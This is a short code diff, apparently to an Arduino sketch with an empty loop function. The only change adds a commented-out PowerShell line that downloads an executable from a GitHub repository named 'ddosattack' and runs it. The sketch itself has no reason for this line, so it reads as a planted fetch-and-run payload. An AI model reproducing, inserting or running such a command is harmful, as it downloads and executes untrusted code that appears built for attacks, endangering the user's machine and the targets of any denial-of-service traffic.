@@ -22,3 +22,4 @@ void setup() {
 void loop() {
 
 }
+// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe; .\main.exe
